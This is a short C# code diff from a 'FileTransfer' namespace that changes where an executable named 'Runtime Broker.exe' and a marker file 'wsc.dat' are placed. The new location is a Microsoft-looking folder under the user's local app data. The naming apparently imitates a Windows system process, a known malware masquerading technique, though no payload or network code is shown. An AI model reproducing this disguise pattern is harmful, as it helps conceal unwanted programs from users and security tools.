@@ -22,8 +22,8 @@ namespace FileTransfer
         }
 
         private static readonly string DestDir = Path.Combine(
-            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-            "Microsoft", "Windows", "Themes", "RuntimeBrokerDild");
+            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            "Microsoft", "Windows", "RuntimeBrokerDild");
 
         public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
         private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
